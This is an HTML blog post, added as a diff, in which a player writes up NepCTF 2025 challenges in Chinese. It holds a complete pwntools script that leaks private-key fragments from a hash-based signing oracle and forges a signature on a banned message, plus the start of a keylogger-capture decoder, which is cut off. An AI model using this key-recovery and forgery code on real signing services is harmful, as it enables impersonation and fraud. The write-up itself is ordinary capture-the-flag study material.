@@ -1,0 +1,866 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Wang1r">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/07/28/nepctf-wp/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="CryptoNepsignDeepseek脚本秒了，就是跑的有点慢： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NepCTF个人WP与赛后总结">
+<meta property="og:url" content="http://example.com/2025/07/28/nepctf-wp/index.html">
+<meta property="og:site_name" content="Wang1r的博客">
+<meta property="og:description" content="CryptoNepsignDeepseek脚本秒了，就是跑的有点慢： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/07/28/nepctf-wp/1.png">
+<meta property="og:image" content="http://example.com/2025/07/28/nepctf-wp/2.png">
+<meta property="og:image" content="http://example.com/2025/07/28/nepctf-wp/3.png">
+<meta property="og:image" content="http://example.com/2025/07/28/nepctf-wp/4.png">
+<meta property="og:image" content="http://example.com/2025/07/28/nepctf-wp/5.png">
+<meta property="og:image" content="http://example.com/2025/07/28/nepctf-wp/6.png">
+<meta property="og:image" content="http://example.com/2025/07/28/nepctf-wp/7.png">
+<meta property="og:image" content="http://example.com/2025/07/28/nepctf-wp/8.png">
+<meta property="og:image" content="http://example.com/2025/07/28/nepctf-wp/9.png">
+<meta property="article:published_time" content="2025-07-28T12:16:20.000Z">
+<meta property="article:modified_time" content="2025-07-28T06:56:54.650Z">
+<meta property="article:author" content="Wang1rrr">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/07/28/nepctf-wp/1.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/example.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/example.png">
+    <meta name="theme-color" content="#FFD700">
+    <link rel="shortcut icon" href="/images/example.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            NepCTF个人WP与赛后总结 | Wang1rrr&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+        <link href="" rel="stylesheet">
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#FFD700","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/690195.jpg","dark":"/images/690195.jpg"},"title":"想要成为特别的人","subtitle":{"text":[],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#000","dark":"#d1d1b6"},"text_style":{"title_size":"3.2rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"YouYuan","url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Wang1rrr","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"},"About":{"icon":"fa-regular fa-user","path":"/about/"},"Friends":{"icon":"fa-solid fa-link","path":"/links/"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"cloud"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/1 12:00:00"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Wang1rrr&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about/"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links/"
+                                        >
+                                    <i class="fa-solid fa-link fa-fw"></i>
+                                    友情链接
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about/"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links/"
+                        >
+                            <span>
+                                友情链接
+                            </span>
+                            
+                                <i class="fa-solid fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">31</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">NepCTF个人WP与赛后总结</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/example.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Wang1r</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-07-28 20:16:20</span>
+        <span class="mobile">2025-07-28 20:16:20</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-07-28 14:56:54</span>
+            <span class="mobile">2025-07-28 14:56:54</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/WP/">WP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Nepsign"><a href="#Nepsign" class="headerlink" title="Nepsign"></a>Nepsign</h3><p>Deepseek脚本秒了，就是跑的有点慢：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>  <span class="comment"># 设置为 &#x27;info&#x27; 或 &#x27;error&#x27; 以减少输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SM3 辅助函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(data)</span><br><span class="line">    d = <span class="built_in">list</span>(data)</span><br><span class="line">    <span class="keyword">return</span> sm3.sm3_hash(d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SM3_n</span>(<span class="params">data, n=<span class="number">1</span>, bits=<span class="number">256</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(data)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(SM3(data))</span><br><span class="line">    <span class="keyword">return</span> data.<span class="built_in">hex</span>()[:bits//<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">hex_symbols = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">banned_msg = <span class="string">b&#x27;happy for NepCTF 2025&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接服务</span></span><br><span class="line">host = <span class="string">&#x27;nepctf32-vw2p-ntkn-lohq-o8mghokeu569.nepctf.com&#x27;</span>  <span class="comment"># 替换为实际题目提供的域名</span></span><br><span class="line">port = <span class="number">443</span></span><br><span class="line">conn = remote(host, port, ssl=<span class="literal">True</span>, sni=host)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收初始信息</span></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;initializing...\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 恢复私钥</span></span><br><span class="line">recovered_sk = [<span class="literal">None</span>] * <span class="number">48</span></span><br><span class="line">total_attempts = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算一个消息的步骤值（本地计算）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_steps</span>(<span class="params">msg</span>):</span><br><span class="line">    m = SM3(msg)</span><br><span class="line">    m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">    a = [<span class="built_in">int</span>(m_bin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    sum_arr = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            <span class="keyword">if</span> m[pos] == hex_symbols[i]:</span><br><span class="line">                s += pos + <span class="number">1</span></span><br><span class="line">        sum_arr.append(s % <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> a + sum_arr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">any</span>(sk <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">for</span> sk <span class="keyword">in</span> recovered_sk):</span><br><span class="line">    total_attempts += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Attempt #<span class="subst">&#123;total_attempts&#125;</span> - Recovered: <span class="subst">&#123;<span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> sk <span class="keyword">in</span> recovered_sk <span class="keyword">if</span> sk <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>)&#125;</span>/48&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 生成随机消息</span></span><br><span class="line">    msg = os.urandom(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> msg == banned_msg:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 发送签名请求</span></span><br><span class="line">    conn.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    conn.sendlineafter(<span class="string">b&#x27;msg: &#x27;</span>, msg.<span class="built_in">hex</span>().encode())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取响应</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = conn.recvline().decode().strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You can&#x27;t do that&quot;</span> <span class="keyword">in</span> resp:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        qq_list = ast.literal_eval(resp)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error parsing response: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 本地计算步骤</span></span><br><span class="line">    steps = compute_steps(msg)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查并恢复私钥片段</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">        <span class="keyword">if</span> steps[i] == <span class="number">0</span> <span class="keyword">and</span> recovered_sk[i] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># 验证是否为有效的十六进制字符串</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdef&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> qq_list[i]):</span><br><span class="line">                    recovered_sk[i] = qq_list[i]</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Recovered sk[<span class="subst">&#123;i&#125;</span>] = <span class="subst">&#123;qq_list[i]&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;All private key fragments recovered!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造目标消息的签名</span></span><br><span class="line">msg_target = banned_msg</span><br><span class="line">m = SM3(msg_target)</span><br><span class="line">m_bin = <span class="built_in">bin</span>(<span class="built_in">int</span>(m, <span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">256</span>)</span><br><span class="line">a = [<span class="built_in">int</span>(m_bin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">sum_arr = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span> m[pos] == hex_symbols[i]:</span><br><span class="line">            s += pos + <span class="number">1</span></span><br><span class="line">    sum_arr.append(s % <span class="number">255</span>)</span><br><span class="line">steps_target = a + sum_arr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算签名</span></span><br><span class="line">forged_sig = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>):</span><br><span class="line">    sk_hex = recovered_sk[i]</span><br><span class="line">    n_iter = steps_target[i]</span><br><span class="line">    forged_sig.append(SM3_n(<span class="built_in">bytes</span>.fromhex(sk_hex), n_iter, <span class="number">256</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交签名获取flag</span></span><br><span class="line">conn.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">b&#x27;give me a qq: &#x27;</span>, <span class="built_in">str</span>(forged_sig).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取flag</span></span><br><span class="line">flag = conn.recvline().decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="NepBotEvent"><a href="#NepBotEvent" class="headerlink" title="NepBotEvent"></a>NepBotEvent</h3><p>起初没什么思路，但是后来在网上直接搜到其他选手的AI对话记录（应该不能算作弊吧）</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">decode_nepbot_keylogger.py</span></span><br><span class="line"><span class="string">还原 /dev/input/event* 键盘抓包文本</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> struct, re, sys, pathlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 1. HID usage → 纯小写字符（不含 Shift）------------------------</span></span><br><span class="line">hid2char = &#123;</span><br><span class="line">    **&#123;i + <span class="number">4</span>: <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)&#125;,          <span class="comment"># a-z</span></span><br><span class="line">    **&#123;<span 